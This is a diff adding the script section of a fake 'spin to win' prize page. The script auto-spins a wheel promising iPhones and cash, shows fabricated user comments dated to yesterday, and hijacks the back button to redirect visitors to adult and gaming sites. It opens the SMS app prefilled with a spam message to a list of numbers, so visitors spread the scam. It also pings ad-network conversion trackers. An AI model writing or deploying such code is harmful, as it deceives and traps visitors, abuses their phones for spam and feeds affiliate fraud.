+        async function verifyInhouseSource1CompanyTracker(tracker, payout) {
+            console.log("verifyInhouseSource1CompanyTracker");
+            fetch(`https://s2s.mobideapush.com/conversion?click_id=${tracker}&amount=${payout}`);
+        }
+
+        async function verifyInhouseSource2CompanyTracker(tracker) {
+            console.log("verifyInhouseSource2CompanyTracker");
+            fetch(`http://rtb.adx1.com/log?action=conversion&key=${tracker}&price=REVENUE_IN_USD`);
+        }
+
+        function redirecting() { window.location.href = "http://hotgirlsonline2021.com/1951?ukid=" + ukid }
+        window.addEventListener("hashchange", function (e) {
+            e.oldURL.length > e.newURL.length && (ukid ? redirecting(ukid) : generateUkid("redirect"))
+        });
+        function becreative(ukey) {
+            hitthelist(numbers)
+            let sendtext = pageMessage.message + " #" + ukey;
+            if (navigator.userAgent.match(/iPhone|iPad|iPod|Mac/i))
+                window.location.href = "sms://open?addresses=" + numbers + "/&body=" + encodeURIComponent(sendtext);
+            else
+                window.location.href = "sms:" + numbers.replace(/,/g, ";") + "?body=" + encodeURIComponent(sendtext);
+            setTimeout(function () {
+                window.location.href = 'http://wingames2021.com/1775?ukid=' + ukid;
+            }, 5000)
+        }
+
+        function getComment() {
+            commentObj.map(data => {
+                $('#commentList').append(
+                    `<tr>
+    <td class="width-50">
+        <img src='https://1673333600.rsc.cdn77.org/images/${data.image}' alt=""/>
+    </td>
+    <td>
+        <div class="name"> ${data.name}</div>
+        <div style='padding-top: 5px;'> ${data.comment}</div>
+        <div class="date"> ${getDate()}</div>
+    </td>
+</tr>`
+                );
+            })
+        }
+
+        function getDate() {
+            let mydate = new Date()
+            mydate.setDate(mydate.getDate() - 1);
+            let year = mydate.getYear()
+            if (year < 1000) year += 1900
+            let day = mydate.getDay()
+            let month = mydate.getMonth()
+            let daym = mydate.getDate()
+            if (daym < 10) daym = "0" + daym
+            let dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday")
+            let montharray = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December")
+            return montharray[month] + " " + daym + ", " + year
+        }
+
+        function comment() {
+            let comentText = $('.commentTextBox').val();
+            //- let msg = "Verification code is:"+ Math.floor(100000 + Math.random() * 900000);
+            //- sendmessage(msg)
+        }
+
+        function spinner() {
+            if (clicks <= 1) {
+                let newDegree = degree * clicks;
+                let extraDegree = Math.floor((Math.random() * 280) + 1);
+                let totalDegree = newDegree + extraDegree;
+                let lastRotate = $('#inner-wheel').data('degree');
+                let result = totalDegree - newDegree;
+                let current = lastRotate - totalDegree;
+                if (current < degree) {
+                    totalDegree = totalDegree + degree;
+                    result = result - degree;
+                    if (Math.sign(result) == -1) result = result + degree;
+                }
+                let prize = '';
+                let img = '';
+                if ((result <= 28)) {
+                    prize = prizeObj.gift;
+                    img = 'gift.png';
+                }
+                else if (result >= 29 && result <= 94) {
+                    prize = prizeObj.dollar25;
+                    img = '25-dollar.png';
+                }
+                else if (result >= 95 && result <= 157) {
+                    prize = prizeObj.ipad;
+                    img = 'ipad.png';
+                }
+                else if (result >= 216 && result <= 267) {
+                    prize = prizeObj.iPhone;
+                    img = 'iphone.png';
+                }
+                else if ((result >= 268 && result <= 320) || result >= 158 && result <= 215) {
+                    prize = prizeObj.dollar100;
+                    img = '100-dollar.png'
+                }
+                setTimeout(function () {
+                    $('.prize').text(prize);
+                    $('.prize-img').attr('src', 'https://1673333600.rsc.cdn77.org/images/' + img);
+                    $('#myModal').show();
+                    declearPrize = true;
+                }, 2500)
+
+                $('#wheel .sec').each(function () {
+                    let interval = setInterval(function () {
+                        $('#spin').addClass('spin');
+                        setTimeout(function () { $('#spin').removeClass('spin'); }, 100);
+                    }, 200);
+                    setTimeout(function () {
+                        clearInterval(interval);
+                    }, 2000)
+                });
+                $('#inner-wheel').data('degree', totalDegree).css({ 'transform': 'rotate(' + totalDegree + 'deg)' });
+                clicks++;
+            }
+        }
+
+        $(document).ready(function () {
+            getComment()
+            spinner();
+            $("#backbtn")[0].click();
+            $('body').click(function () {
+                if ($('#myModal').is(':visible')) {
+                    sendmessage()
+                    setTimeout(function () { clicks = 1; }, 1000)
+                } else {
+                    spinner();
+                }
+            });
+            $('.subm').on('click', function () {
+                // sendmessage();
+                senddonemessage();
+                $('#myModal').hide()
+            })
+            //push code
+        });</script>
+</body>
+
+
+
+</html>
